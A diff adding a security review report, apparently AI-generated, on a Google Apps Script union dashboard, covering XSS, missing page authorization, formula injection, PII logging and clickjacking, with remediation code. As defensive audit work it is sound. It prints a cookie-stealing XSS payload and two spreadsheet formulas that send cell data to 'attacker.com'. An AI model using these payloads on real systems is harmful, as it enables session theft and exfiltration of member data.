@@ -1,0 +1,408 @@
+# Security Review Report
+
+**Repository:** Union Steward Dashboard v4.5.0
+**Review Date:** February 2, 2026
+**Reviewer:** Claude Code Security Analysis
+**Branch:** claude/security-review-cg1Ch
+
+---
+
+## Executive Summary
+
+This comprehensive security review analyzed the Union Steward Dashboard, a Google Apps Script application consisting of 15 modules (~47,000 lines of code). The application manages union grievances, member data, and provides web-based dashboards for stewards and members.
+
+### Security Posture Summary
+
+| Category | Severity | Status |
+|----------|----------|--------|
+| Cross-Site Scripting (XSS) | CRITICAL | **Multiple vulnerabilities found** |
+| Authentication/Authorization | HIGH | **Partial implementation with gaps** |
+| Input Validation | MEDIUM | **Implemented but inconsistent** |
+| Secrets Management | LOW | **Properly implemented** |
+| Formula Injection | MEDIUM | **Partially mitigated** |
+| PII Exposure | MEDIUM | **Logging issues identified** |
+| Clickjacking | LOW | **ALLOWALL X-Frame-Options used** |
+| Dependency Security | LOW | **Dev dependencies only** |
+
+### Overall Risk Assessment: **MEDIUM-HIGH**
+
+The application has made significant progress in implementing security controls (version 4.5.0 added access control and input validation to the web app), but critical XSS vulnerabilities remain unresolved from previous reviews.
+
+---
+
+## 1. Critical Security Vulnerabilities
+
+### 1.1 Cross-Site Scripting (XSS) - CRITICAL
+
+**Status:** NOT FIXED (persists from v4.4.1 review)
+
+Multiple instances of user-controlled data being directly inserted into `innerHTML` without sanitization:
+
+| File | Line(s) | Vulnerable Code Pattern |
+|------|---------|------------------------|
+| `09_Dashboards.gs` | 316-331 | `c.innerHTML=data.map(...)` with `r.worksite`, `r.role`, `r.shift` |
+| `10_Main.gs` | 1831-1838 | `html += ... m.name + ... m.id + ... m.email` |
+| `11_CommandHub.gs` | 1230-1241 | `name`, `id`, `email` directly concatenated |
+| `04_UIService.gs` | 669-674 | `item.id`, `item.label` in innerHTML |
+| `05_Integrations.gs` | 1528, 1706, 1890 | Member/grievance data in innerHTML |
+
+**Proof of Concept:**
+A malicious actor with access to edit member data could inject:
+```
+<img src=x onerror="alert(document.cookie)">
+```
+into fields like "First Name" or "Work Location", which would execute when rendered.
+
+**Impact:**
+- Session hijacking via cookie theft
+- Data exfiltration
+- UI manipulation/defacement
+- Phishing attacks through injected content
+
+**Remediation:**
+The codebase has `escapeHtml()` functions in `00_Security.gs` but they are not consistently used. All innerHTML assignments must escape user data:
+
+```javascript
+// BEFORE (vulnerable)
+container.innerHTML = '<div>' + member.name + '</div>';
+
+// AFTER (safe)
+container.innerHTML = '<div>' + escapeHtml(member.name) + '</div>';
+```
+
+**Files requiring fixes:**
+- `src/09_Dashboards.gs:316-331`
+- `src/10_Main.gs:1831-1838`
+- `src/11_CommandHub.gs:1230-1241`
+- `src/04_UIService.gs:669-674, 2373, 2449, 2602`
+- `src/05_Integrations.gs:1528, 1706, 1890`
+- `src/03_UIComponents.gs:2119, 2232`
+
+---
+
+### 1.2 Incomplete Access Control in Web App - HIGH
+
+**Status:** PARTIALLY FIXED in v4.5.0
+
+The `doGet()` function in `05_Integrations.gs:1114-1203` now includes access control for `mode=steward`, but gaps remain:
+
+**Positive Changes (v4.5.0):**
+- Input validation via `validateWebAppRequest()`
+- Authorization check for steward mode
+- Parameter allowlists implemented
+
+**Remaining Issues:**
+
+1. **Pages `search`, `grievances`, `members` accessible without authentication:**
+   ```javascript
+   // Lines 1173-1197: No auth check for these pages
+   switch (page) {
+     case 'search':
+       html = getWebAppSearchHtml();  // No auth!
+       break;
+     case 'grievances':
+       html = getWebAppGrievanceListHtml();  // No auth!
+       break;
+     case 'members':
+       html = getWebAppMemberListHtml();  // No auth!
+       break;
+   ```
+
+2. **Member portal has no authorization check:**
+   ```javascript
+   // Line 1152-1161: Member ID validation but no auth
+   if (memberId) {
+     if (!isValidMemberId(memberId)) { ... }
+     return buildMemberPortal(memberId);  // Anyone can access any member's portal
+   }
+   ```
+
+**Impact:**
+- Unauthorized access to member PII
+- Potential IDOR (Insecure Direct Object Reference) vulnerability
+- Anyone with the web app URL can view grievance and member data
+
+**Remediation:**
+Add authorization checks to all sensitive pages:
+```javascript
+case 'grievances':
+  var authResult = checkWebAppAuthorization('steward');
+  if (!authResult.isAuthorized) {
+    return getAccessDeniedPage(authResult.message);
+  }
+  html = getWebAppGrievanceListHtml();
+  break;
+```
+
+---
+
+### 1.3 Formula Injection - MEDIUM
+
+**Status:** PARTIALLY MITIGATED
+
+The codebase has `escapeForFormula()` in `00_Security.gs:121-137`, but some QUERY formulas still use unsanitized input:
+
+| File | Line | Issue |
+|------|------|-------|
+| `08_SheetUtils.gs` | 3377, 3720, 4080, 4147 | Template literals with sheet names |
+| `12_Features.gs` | 1647, 1651-1652 | Sheet names in QUERY formulas |
+| `01_Core.gs` | 216-220 | `sanitizeForQuery()` only escapes quotes/backslashes |
+
+**Impact:**
+A malicious sheet name or user input could execute formulas like:
+- `=IMPORTXML("http://attacker.com/steal?data="&A1, "//text()")`
+- `=WEBSERVICE("http://attacker.com/exfiltrate?data="&CONCATENATE(A:A))`
+
+---
+
+## 2. Medium Severity Issues
+
+### 2.1 PII Exposure in Logs - MEDIUM
+
+**Status:** PARTIALLY ADDRESSED
+
+While `00_Security.gs` provides PII masking functions, some logs still expose sensitive data:
+
+| File | Line | Data Exposed |
+|------|------|--------------|
+| `08_SheetUtils.gs` | 2669, 2671 | Email addresses in plaintext |
+| `10_Main.gs` | 226 | User email in sabotage alerts |
+| `05_Integrations.gs` | 897 | Member email logged |
+| `11_CommandHub.gs` | 2554 | Last 6 chars of API key logged |
+
+**Remediation:**
+Replace direct logging with `secureLog()` or use `maskEmail()`:
+```javascript
+// BEFORE
+Logger.log('Sent alert to ' + email);
+
+// AFTER
+secureLog('DeadlineAlert', 'Sent notification', { email: email });
+```
+
+---
+
+### 2.2 Clickjacking Vulnerability - MEDIUM
+
+**Status:** PRESENT
+
+Four locations use `setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL)`:
+
+| File | Line |
+|------|------|
+| `05_Integrations.gs` | 1146, 1201 |
+| `11_CommandHub.gs` | 3221, 3236 |
+
+This allows the application to be embedded in iframes on any domain, enabling clickjacking attacks.
+
+**Remediation:**
+For internal-only pages, use `DENY` or `SAMEORIGIN`:
+```javascript
+.setXFrameOptionsMode(HtmlService.XFrameOptionsMode.DENY)
+```
+
+---
+
+### 2.3 Weak Query Sanitization - MEDIUM
+
+**Location:** `01_Core.gs:216-220`
+
+```javascript
+function sanitizeForQuery(input) {
+  if (!input) return '';
+  return String(input)
+    .replace(/'/g, "''")
+    .replace(/\\/g, '\\\\');
+}
+```
+
+This is insufficient for preventing formula injection in Google Sheets contexts.
+
+---
+
+## 3. Low Severity Issues
+
+### 3.1 Development Code in Production - LOW
+
+**File:** `src/07_DevTools.gs`
+
+This file contains functions like `NUKE_SEEDED_DATA()` that could cause data loss if accidentally invoked. The file header warns to delete before production but it remains in the build.
+
+**Recommendation:**
+- Add build-time exclusion for this file
+- Or remove it entirely and use a separate development spreadsheet
+
+---
+
+### 3.2 Excessive Session User Calls - LOW
+
+42 instances of `Session.getActiveUser().getEmail()` or `Session.getEffectiveUser().getEmail()` scattered throughout the codebase.
+
+**Impact:** Minor performance overhead and inconsistent error handling.
+
+**Recommendation:** Centralize in a helper function with caching:
+```javascript
+var CurrentUser = {
+  _email: null,
+  getEmail: function() {
+    if (!this._email) {
+      try {
+        this._email = Session.getActiveUser().getEmail() || 'Unknown';
+      } catch (e) {
+        this._email = 'Unknown';
+      }
+    }
+    return this._email;
+  }
+};
+```
+
+---
+
+### 3.3 Dependency Versions - LOW
+
+The `package.json` specifies ESLint 9.x but `package-lock.json` has ESLint 8.57.0. This version mismatch could cause build inconsistencies.
+
+**Dependencies:**
+- `@google/clasp: ^2.4.2` - No known vulnerabilities
+- `@types/google-apps-script: ^1.0.83` - Type definitions only
+- `eslint: 8.57.0 / ^9.39.0` - Version mismatch, no security issues
+- `husky: ^9.1.7` - No known vulnerabilities
+
+All dependencies are development-only and do not run in production (Google Apps Script runtime).
+
+---
+
+## 4. Security Controls Assessment
+
+### 4.1 Authentication & Authorization
+
+| Control | Status | Notes |
+|---------|--------|-------|
+| User identification | **Implemented** | Via `Session.getEffectiveUser()` |
+| Role-based access | **Implemented** | admin/steward/member/anonymous |
+| Steward mode protection | **Implemented** | Requires steward/admin role |
+| Member portal access | **Partial** | No auth required, only format validation |
+| Page-level access control | **Incomplete** | search/grievances/members pages unprotected |
+
+### 4.2 Input Validation
+
+| Control | Status | Notes |
+|---------|--------|-------|
+| Web app parameter validation | **Implemented** | `validateWebAppRequest()` |
+| Mode allowlist | **Implemented** | 8 allowed values |
+| Page allowlist | **Implemented** | 6 allowed values |
+| Member ID format | **Implemented** | Alphanumeric + hyphen/underscore |
+| Filter allowlist | **Implemented** | 5 allowed values |
+| Dangerous pattern detection | **Implemented** | Blocks `<script>`, `javascript:`, `on*=` |
+
+### 4.3 Output Encoding
+
+| Control | Status | Notes |
+|---------|--------|-------|
+| HTML escaping functions | **Implemented** | `escapeHtml()`, `sanitizeForHtml()` |
+| Formula escaping | **Implemented** | `escapeForFormula()` |
+| Client-side escaping | **Implemented** | `getClientSideEscapeHtml()` |
+| Consistent application | **NOT IMPLEMENTED** | Functions exist but not used everywhere |
+
+### 4.4 Audit Logging
+
+| Control | Status | Notes |
+|---------|--------|-------|
+| Audit log sheet | **Implemented** | Hidden `_AuditLog` sheet |
+| Change tracking | **Implemented** | All edits logged via `handleSecurityAudit_()` |
+| Mass deletion alerts | **Implemented** | >15 cells triggers email alert |
+| PII masking in logs | **Partial** | `secureLog()` available but not always used |
+
+### 4.5 Secrets Management
+
+| Control | Status | Notes |
+|---------|--------|-------|
+| API key storage | **Secure** | `PropertiesService.getScriptProperties()` |
+| No hardcoded secrets | **Verified** | No credentials in source code |
+| API key preview logging | **Acceptable** | Only last 6 chars logged |
+
+---
+
+## 5. Prioritized Remediation Plan
+
+### Immediate (P0) - Critical Security Fixes
+
+| # | Issue | Effort | Files |
+|---|-------|--------|-------|
+| 1 | Fix XSS in all innerHTML assignments | 2-3 days | 6 files, ~50 locations |
+| 2 | Add auth to search/grievances/members pages | 1 day | `05_Integrations.gs` |
+| 3 | Add auth to member portal endpoint | 0.5 days | `05_Integrations.gs`, `11_CommandHub.gs` |
+
+### Short-term (P1) - High Priority
+
+| # | Issue | Effort | Files |
+|---|-------|--------|-------|
+| 4 | Replace all direct PII logging with `secureLog()` | 1 day | Multiple |
+| 5 | Change X-Frame-Options to DENY for internal pages | 0.5 days | 2 files |
+| 6 | Strengthen formula sanitization | 1 day | `01_Core.gs`, `08_SheetUtils.gs` |
+
+### Medium-term (P2)
+
+| # | Issue | Effort | Files |
+|---|-------|--------|-------|
+| 7 | Exclude DevTools.gs from production build | 0.5 days | `build.js` |
+| 8 | Centralize user session handling | 1 day | Multiple |
+| 9 | Fix ESLint version mismatch | 0.5 days | `package.json` |
+
+---
+
+## 6. Security Best Practices Checklist
+
+### Implemented
+- [x] Input validation with allowlists
+- [x] Audit logging of changes
+- [x] Mass deletion detection
+- [x] PII masking functions available
+- [x] Formula injection prevention functions
+- [x] HTML escaping functions available
+- [x] Role-based access control framework
+- [x] Secure credential storage (PropertiesService)
+- [x] No hardcoded secrets
+
+### Not Implemented / Incomplete
+- [ ] Consistent XSS prevention across all views
+- [ ] Complete access control on all web endpoints
+- [ ] PII masking in all log statements
+- [ ] Clickjacking protection (X-Frame-Options)
+- [ ] Security testing automation
+- [ ] Regular dependency audits
+
+---
+
+## 7. Comparison with Previous Review (v4.4.1)
+
+| Issue | v4.4.1 Status | v4.5.0 Status |
+|-------|---------------|---------------|
+| XSS vulnerabilities | Critical | **Still Critical** |
+| Missing web app auth | Critical | **Partially Fixed** |
+| Formula injection | Critical | **Partially Fixed** |
+| PII in logs | Medium | **Still Medium** |
+| Access control | Missing | **Implemented** |
+| Input validation | Missing | **Implemented** |
+
+**Progress:** Version 4.5.0 added significant security improvements including access control framework, input validation, and parameter allowlists. However, the critical XSS vulnerabilities identified in v4.4.1 remain unresolved.
+
+---
+
+## 8. Conclusion
+
+The Union Steward Dashboard has a solid security foundation with audit logging, role-based access control, and input validation. However, **critical XSS vulnerabilities must be addressed immediately** before this application handles sensitive union member data in production.
+
+The security functions exist (`escapeHtml`, `sanitizeForHtml`, etc.) but are not consistently applied throughout the codebase. The primary remediation effort should focus on:
+
+1. **Auditing all innerHTML assignments** and applying escapeHtml
+2. **Adding authorization checks** to all web app endpoints
+3. **Using secure logging** for all PII-related operations
+
+Once these critical issues are resolved, the application's security posture will be significantly improved.
+
+---
+
+*Generated by Claude Code Security Review*
+*Session: https://claude.ai/code/session_01HRiiNqj6cH2mKzexCcoBcf*
